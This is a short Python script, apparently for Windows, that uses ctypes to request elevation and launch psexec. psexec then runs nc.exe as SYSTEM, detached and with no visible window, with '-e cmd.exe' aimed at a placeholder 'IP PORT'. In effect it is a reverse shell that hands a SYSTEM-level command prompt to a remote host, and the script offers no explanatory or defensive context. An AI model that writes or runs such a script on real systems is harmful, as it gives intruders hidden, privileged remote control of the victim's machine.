import ctypes
ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", \
u"-accepteula -nobanner -s -d C:\\Users\\usuario\\Desktop\\nc.exe IP PORT -e cmd.exe",None,0)

